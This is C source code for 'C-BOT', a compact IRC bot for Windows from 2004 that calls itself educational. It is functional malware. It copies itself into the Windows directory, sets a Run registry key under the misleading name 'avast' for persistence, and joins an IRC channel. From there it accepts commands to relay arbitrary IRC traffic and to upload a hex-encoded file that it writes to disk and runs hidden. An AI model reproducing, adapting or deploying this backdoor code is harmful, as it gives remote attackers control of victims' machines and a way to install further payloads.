/* C-BOT, a simple compact IRC bot by DoxtorL, November-December 2004

Features:

-Can be used to send IRC commands.
-Automatic rejoin.
-Automatic answer send back to private message.
-Can be used to upload and run a file tru IRC, no dcc used.
 (a base16 encoding scheme is used)
-Key added in registry to make the bot resident.

This program is intended to demonstrate the fact that compact internet 
applications, written in C, can be created.
It's for educationnal aims only.

Many thanks to e*a (he will know who he is) to have provided
a skeleton and to have fix my parsing routine.

Program written for Pelles-C, a free C (only) powerful compiler.

*/

#include <windows.h>
#include <winsock.h>
#include <stdio.h>
#include <stdlib.h>
#include <winreg.h>

#define HTON(port) (256*((port)%256)+((port)/256))

#define MAX_TOKEN 16

//no place left in dos stub.
#define SUBKEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define HKEY_LM "HKEY_LOCAL_MACHINE"

//#define SZNICK "NICK ctbot\nUSER x x x x\r\n"
//#define NICK "ctbot"
//#define HOST "amsterdam2.nl.eu.undernet.org"
//#define CMD_PONG "PONG "
//#define CMD_JOIN "JOIN "
//#define CMD_MSG "PRIVMSG "
//#define CHANNEL "#usa"
//#define TEXTZ   " wtf?\r\n"
//#define PING "PING"
//#define PRIVMSG "privmsg"
//#define KICK "kick"
//#define CRLF "\r\n"
//#define RULE ":%EX"
//#define UPLOAD "%UP"

#define sizeofHEADER 512
#define sizeofCODE 2560
#define sizeofSZNICK 26
#define sizeofNICK 5
#define sizeofHOST 29
#define sizeofCMD_PONG 5
#define sizeofCMD_JOIN 5
#define sizeofCMD_MSG 8
#define sizeofCHANNEL 9
#define sizeofTEXTZ 7
#define sizeofPING 4
#define sizeofPRIVMSG 7
#define sizeofKICK 4
#define sizeofCRLF 2
#define sizeofRULE 4
#define sizeofBLANK 0
#define sizeofUPLOAD 4
#define sizeofEXE 10

#define BASE 0x400000
#define BASE_CODE 0x401000
#define BASE_STUB 0x400040
#define PTR_SZNICK BASE_STUB

#define PTR_NICK      PTR_SZNICK     +sizeofSZNICK+1
#define PTR_HOST      PTR_NICK       +sizeofNICK+1
#define PTR_CMD_PONG  PTR_HOST       +sizeofHOST+1
#define PTR_CMD_JOIN  PTR_CMD_PONG   +sizeofCMD_PONG+1
#define PTR_CMD_MSG   PTR_CMD_JOIN   +sizeofCMD_JOIN+1
#define PTR_CHANNEL   PTR_CMD_MSG    +sizeofCMD_MSG+1
#define PTR_TEXTZ     PTR_CHANNEL    +sizeofCHANNEL+1
#define PTR_PING      PTR_TEXTZ      +sizeofTEXTZ+1
#define PTR_PRIVMSG   PTR_PING       +sizeofPING+1
#define PTR_KICK      PTR_PRIVMSG    +sizeofPRIVMSG+1
#define PTR_CRLF      PTR_KICK       +sizeofKICK+1
#define PTR_RULE      PTR_CRLF       +sizeofCRLF+1
#define PTR_BLANK     PTR_RULE       +sizeofRULE+1
#define PTR_UPLOAD    PTR_BLANK      +sizeofBLANK+1
#define PTR_EXE       PTR_UPLOAD     +sizeofUPLOAD+1
#define PTR_EXE_UP    PTR_EXE        +sizeofEXE+1

int flag_send=0,sock;

void make_answer(char *cmd,char *prm1,char* prm2)
{
 char answer[512];
 unsigned int size;
 HKEY hkey;
 HFILE fd;

 *answer=0;
 lstrcat(answer,cmd);
 lstrcat(answer,prm1);
 lstrcat(answer,prm2);
 size=lstrlen(answer);
 if(flag_send)
   send(sock,answer,size,0);
 else //registry stuff and copy to windows dir c-bot (from memory)
 {
  fd=_lcreat(answer,0);
  _lwrite(fd,(CHAR*)BASE,sizeofHEADER);
  _lwrite(fd,(CHAR*)BASE_CODE,sizeofCODE);
  _lclose(fd);
  RegOpenKeyExA(HKEY_LOCAL_MACHINE,SUBKEY,0,KEY_WRITE,&hkey);
  RegSetValueEx(hkey,"avast",0,REG_SZ,answer,size);
  RegCloseKey(hkey);
 }
}

void main()
{
 WSADATA wsa;
 struct hostent *he;
 struct sockaddr_in sin;
 unsigned int count_pong=0;
 HFILE fd;
 int val,flag,idx;
 static char buf[2400];
 static char msg[512];
 static char* token[16];
 char windir[MAX_PATH];
 char *prefix;
 char *command;
 char *params;
 unsigned i,j,k;
 unsigned msglen;
 int pref,buflen;

 GetWindowsDirectory(windir,MAX_PATH);
 make_answer(windir,"\\",(CHAR*)PTR_EXE); 
 flag_send++;

 WSAStartup(MAKEWORD(1,1),&wsa);
 sock=socket(AF_INET,SOCK_STREAM,0);
 he=gethostbyname((char*)PTR_HOST);

 if (!he) goto exit;
 sin.sin_family=AF_INET;
 sin.sin_port=HTON(6667);
 sin.sin_addr.s_addr=**(unsigned int **)he->h_addr_list;
 if(connect(sock,(struct sockaddr*)&sin,sizeof sin)) goto exit;
	
 send(sock,(char*)PTR_SZNICK,sizeofSZNICK-1,0);
	
 while(1)
 {
   buflen=recv(sock,buf,sizeof buf,0);
   if (buflen<=0) break;
   token[1]=msg; 
   //IRC msg consists of tokens, e.g groups of symbols, separated by 0x20
   for(msglen=i=0;i<buflen;i++) //parse recv buffer
   {
    if (msglen < sizeof(msg)) msg[msglen++]=buf[i];
    if(buf[i]==10) /* process msg (end of msg found) */
    {
     if(msglen < sizeof(msg))  /* check msg overflow*/
     {
      int lastarg;

      pref=(msg[0]==':'); /* prefix does exist*/
      if(pref) k=1; else k=2;
      lastarg=0;
      for(j=1;j<msglen;j++)
      {
       if(!lastarg)
       {
        if(pref && (msg[j]=='!'|| msg[j]=='@'))
          msg[j]=0;
  
        if(msg[j-1]==' ' && msg[j]!=' ')
        {
          msg[j-1]=0;
          token[k++]=msg+j;
        }
       }
       if(k==5)
       lastarg++;        /* beginning of last arg */

       if(msg[j]==13)     /* end of msg */
       {
        msg[j]=0;         /* replace LF by \0...*/
        token[0]=(pref)?msg+1:(char*)PTR_BLANK; /*...or not*/
       }
      }
      prefix=token[0];
      command=token[1];
      params=token[2];

      //Treat commands
      if(!lstrcmpi(command,(char*)PTR_PING)) //pong received?
      {
        make_answer((char*)PTR_CMD_PONG,params,(char*)PTR_CRLF);
        if(!count_pong) 
	{ // first pong received, join predefined channel
          make_answer((char*)PTR_CMD_JOIN,(char*)PTR_CHANNEL,(char*)PTR_CRLF);
          count_pong++;
        }
      }
      else if(!lstrcmpi(command,(char*)PTR_KICK)) //c-bot kicked? If so rejoin
           make_answer((char*)PTR_CMD_JOIN,(char*)PTR_CHANNEL,(char*)PTR_CRLF);
      else if(!lstrcmpi(command,(char*)PTR_PRIVMSG) &&\
           !lstrcmpi(params,(char*)PTR_NICK))
      {
       if(!lstrcmpi(token[3],(char*)PTR_RULE)) //IRC cmd received? 
       make_answer(token[4],(char*)PTR_CRLF,(char*)PTR_BLANK); //..cmd resend
       else 
       {
        if(!lstrcmpi(token[3],(char*)PTR_UPLOAD)) //upload and run cmd?
        {
         idx=0;flag=0;
         while((token[4])[idx])
         {
          switch((token[4])[idx])
          {
           case 'C': //close and run file
           _lclose(fd);
           WinExec((char*)PTR_EXE,SW_HIDE);
           break;
           case 'O': //create/open file to dump uploaded bytes
           fd=_lcreat((char*)PTR_EXE_UP,0);
           break;
           default: 
           if(!flag) val=(token[4])[idx]-'a'; //first nibble?
           else // last nibble
           {
             val=(val<<4)+(token[4])[idx]-'a';
             _lwrite(fd,(char*)&val,1);
           }
           flag=~flag;
          }
          idx++;
         }
        }
        else make_answer((char*)PTR_CMD_MSG,prefix,(char*)PTR_TEXTZ);
       }
      }
      msglen=0;
     }
    }
  }
 }
exit:
WSACleanup();
}
